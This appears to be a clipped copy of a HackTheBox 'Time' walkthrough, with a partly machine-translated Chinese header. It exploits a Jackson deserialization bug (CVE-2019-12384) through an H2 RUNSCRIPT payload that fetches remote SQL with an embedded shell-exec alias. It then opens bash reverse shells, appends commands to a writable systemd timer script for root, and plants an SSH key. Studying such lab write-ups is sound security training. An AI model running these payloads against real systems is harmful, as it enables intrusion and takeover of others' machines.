JSAN 进行反序列化+ssrf

从Systemd计时器中获得的10s的root


# 高温透射率：时间

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/04/03/htb-time.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftime-cover.) 

时间是一个直截了当的盒子，有两个步骤和低枚举。第一步涉及查看来自Web应用程序的错误代码和一些谷歌搜索以查找关联的CVE。从那里，我将使用某些 CVE 编写中的模板构建序列化的 JSON 有效负载，并获取代码执行和 shell。每隔几秒钟就会有一个 Systemd 计时器运行一次，并且正在运行的脚本是世界可写的。要获得root，我只需向该脚本添加一些命令并让它运行。在超越根中，我查看Web服务器以及我是否可以在webroot中写入文件，以及处理我从Systemd计时器中获得的初始短命外壳。

## 箱子信息

名字

[时间](https://www.hackthebox.eu/home/machines/profile/286) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-time.png) 

发行日期

[24 10月 2020](https://twitter.com/hackthebox_eu/status/1319649328294744065)

停用日期

03 4月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftime-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Ftime-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 08分钟 51秒。[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F87545)](https://www.hackthebox.eu/home/users/profile/87545)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 00小时 17分49秒。[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F87545)](https://www.hackthebox.eu/home/users/profile/87545)

创造者

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F94858)](https://www.hackthebox.eu/home/users/profile/94858)-
[![](https://image.cubox.pro/article/2022091820195954522/34202.jpg)](https://www.hackthebox.eu/home/users/profile/27390)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.214
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 15:00 EST
    Nmap scan report for 10.10.10.214
    Host is up (0.014s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds
    oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.214
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 15:01 EST
    Nmap scan report for 10.10.10.214
    Host is up (0.017s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
    |   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
    |_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Online JSON parser
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
    

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

The site is a JSON Beautifier and Validator:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210209150424105.png) 

I verified the site is running php by loading , and getting the same page.`index.php`

I can enter some basic JSON like and it will beautify:`{"foo": "bar", "baz": 1}`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210209150723897.png) 

Giving the same data in Validate returns an error:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210209150825757.png) 

The full error is:

>     Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
>     

So the backend is using Java to validate the JSON, specifically [this package](https://github.com/FasterXML/jackson-databind), Jackson.

## Shell as pericles

### CVE-2019-12384

#### Background

There were a bunch of CVEs for Jackson. In fact, the hardest part of this box was finding the right one that worked here. Eventually I found [this post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) which contained this payload as a test:

    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
    

This is taking advantage of a JSON deserialization vulnerability. In this proof of concept, they are using the H2 database driver (which should be present in most Java deployments that use a database, which is most). This driver can take an SQL script to run, which is typically used benignly to support database migrations.

#### Test

I’ll update the URL to point to my VM:

    ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8/test.sql'"}]
    

On submitting to Time, I get a request at my local HTTP server:

    oxdf@parrot$ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.214 - - [09/Feb/2021 19:23:33] code 404, message File not found
    10.10.10.214 - - [09/Feb/2021 19:23:33] "GET /test.sql HTTP/1.1" 4
    

It worked!

#### Weaponize - POC

There’s a sample SQL script used to weaponize this in the post as well:

    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    	String[] command = {"bash", "-c", cmd};
    	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    	return s.hasNext() ? s.next() : "";  }
    $$;
    CALL SHELLEXEC('id > exploited.txt')
    

The init script can’t run Java, only SQL statements. However, that can be worked around, as within SQL, it is allowed to define an alias containing Java code. In the example about, it defines using Java code to execute a command, and then in the last line calls it with a payload to write the output of to a file.`SHELLEXEC``id`

Since I can’t read a file from Time (well, maybe, but really no - see Beyond Root), I’ll try a :`ping`

    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
            String[] command = {"bash", "-c", cmd};
            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
            return s.hasNext() ? s.next() : "";  }
    $$;
    CALL SHELLEXEC('ping -c 1 10.10.14.8')
    

I’ll update the URL in the JSON, and submit:

    10.10.10.214 - - [09/Feb/2021 19:24:54] "GET /ping.sql HTTP/1.1" 200 -
    

A second later, at :`tcpdump`

    oxdf@parrot$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    19:24:58.130520 IP 10.10.10.214 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
    19:24:58.130534 IP 10.10.14.8 > 10.10.10.214: ICMP echo reply, id 1, seq 1, length
    

It worked. I’ve got RCE.

### Shell

I’ll create a copy of the script, , and add a reverse shell:`rev.sql`

    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
       String[] command = {"bash", "-c", cmd};
       java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
       return s.hasNext() ? s.next() : "";  }
    $$;
    CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"')
    

On submitting, the script is loaded from the webserver, and then the reverse shell comes to :`nc`

    oxdf@parrot$ sudo nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.214] 58288
    bash: cannot set terminal process group (863): Inappropriate ioctl for device
    bash: no job control in this shell
    pericles@time:/var/www/html$ id
    uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
    

I’ll upgrade my shell with the normal trick:

    pericles@time:/var/www/html$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    pericles@time:/var/www/html$ ^Z
    [1]+  Stopped                 sudo nc -lnvp 443
    oxdf@parrot$ stty raw -echo; fg
    sudo nc -lnvp 443
                     reset
    reset: unknown terminal type unknown
    Terminal type? screen
    pericles@time:/var/www/html$ 
    

And grab :`user.txt`

    pericles@time:/home/pericles$ cat user.txt
    7e5b3337************************
    

## Shell as root

### Enumeration

After my normal checks didn’t surface much, I started an HTTP server in my local [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) directory, uploaded it to Time, and ran it:

    pericles@time:/dev/shm$ wget 10.10.14.8/linpeas.sh
    --2021-02-09 22:02:59--  http://10.10.14.8/linpeas.sh
    Connecting to 10.10.14.8:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 320037 (313K) [text/x-sh]
    Saving to: ‘linpeas.sh’
    
    linpeas.sh          100%[===================>] 312.54K  --.-KB/s    in 0.07s   
    
    2021-02-09 22:03:00 (4.12 MB/s) - ‘linpeas.sh’ saved [320037/320037]
    
    pericles@time:/dev/shm$ chmod +x linpeas.sh 
    pericles@time:/dev/shm$ ./linpeas.sh
    ...[snip]...
    

One line that jumped out was in the System Timers section:

    ...[snip]...
    [+] System timers
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers     
    NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES
    Tue 2021-02-09 22:05:01 UTC 5s left       Tue 2021-02-09 22:04:51 UTC 4s ago               timer_backup.timer           timer_backup.service
    ...[snip]...
    

This timer was last run four seconds ago and was going to run again in five seconds. On HTB machines, any timer less than five minutes is worth looking at.

### timer\_backup

The service will be defined in a file in :`/etc/systemd`

    pericles@time:/$ find /etc/systemd/ -name timer_backup.service
    /etc/systemd/system/timer_backup.service
    

That file is relatively simple:

    [Unit]
    Description=Calls website backup
    Wants=timer_backup.timer
    WantedBy=multi-user.target
    
    [Service]
    ExecStart=/usr/bin/systemctl restart web_backup.service
    

The and describes the relation of this service to others as far as starting. describes what it runs. In this case, it’s just restarting another service, . That config:`Wants``WantedBy``ExecStart``web_backup.service`

    [Unit]
    Description=Creates backups of the website
    
    [Service]
    ExecStart=/bin/bash /usr/bin/timer_backup.sh
    

It’s running , a shell script, which is writable:`/usr/bin/timer_backup.sh`

    pericles@time:/$ ls -l /usr/bin/timer_backup.sh
    -rwxrw-rw- 1 pericles pericles 88 Feb  9 22:15 /usr/bin/timer_backup.sh
    

### Initial Shell

I’ll add a reverse shell to the end of the script:

    pericles@time:/$ echo -e '\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' >> /usr/bin/timer_backup.sh
    

Very quickly, I’ve got a root shell at :`nc`

    oxdf@parrot$ sudo nc -lnvp 443
    listening on [any] 443 ...                                     
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.214] 58304
    bash: cannot set terminal process group (65912): Inappropriate ioctl for device
    bash: no job control in this shell                        
    root@time:/#
    

However, the shell dies after like 10 seconds. That’s plenty to get the flag:

    root@time:/# cd root
    root@time:/root# cat root.txt
    ecb18a98************************
    

I’ll look at getting a better shell in Beyond Root.

## Beyond Root

### Writing Via RCE

When testing RCE for the initial foothold, I went with a . I was already confident that it was starting to work, since the SQL script was being requested from my supplied URL, and that seemed like a solid way to test RCE and connectivity back. But as I started to write in my notes that I couldn’t write a file and see it, I wondered - is that true? There’s a webserver after all. Perhaps I could write a webshell (not really sure why I need once since I already have RCE and a reverse shell, but what if a firewall were blocking all outbound?).`ping`

I tried the payload from the site (), but nothing showed up at the web root or any folders I knew about. I cheated a bit, since I had a shell already, and checked.`id > exploited.txt`

    pericles@time:/var/www$ find html/ -name exploited.txt
    

It returned nothing. I modified the payload slightly to . On re-run, that worked:`id > /tmp/exploited.txt`

    pericles@time:/var/www$ cat /tmp/exploited.txt 
    uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
    

So why couldn’t I write to the web root? Well, permissions:

    pericles@time:/var/www$ find html/ -writable
    pericles@time:/var/www$ ls -l               
    total 4
    dr-xr-xr-x 7 pericles pericles 4096 Oct 23 06:44 html
    

There are no folders in that are writable by the pericles user (which is where the RCE happens).`html`

### Utilizing Short-Lived Shells

The shell that came back dies in about 10 seconds, which is enough time to grab . But of course I wanted a stable shell. The easy way to do this is just to have script write my SSH public key into :`root.txt``authorized_keys`

    pericles@time:/var/www/html$ echo -e '\nmkdir -p /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys'  >> /usr/bin/timer_backup.sh
    

This will create the directory if it doesn’t exist, and then write my [tiny ed25519 public key](https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54) into the file.`/root/.ssh``authorized_keys`

Still, cases come up where a short lived shell is all you can get. It’s interesting to see how to script commands to run on the shell. I’ll just them into the listener:`echo``nc`

    oxdf@parrot$ echo 'mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58Q
    vP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys' | sudo nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.214] 58360
    bash: cannot set terminal process group (67254): Inappropriate ioctl for device
    bash: no job control in this shell
    <U19G3d nobody@nothing" > /root/.ssh/authorized_keys
    root@time:/# 
    ^C
    

It connects, and then I’ll Ctrl-C to exit and then connect over SSH, and it works:

    oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.214
    Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)
    ...[snip]...
    root@time:~#
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/04/03/htb-time.html)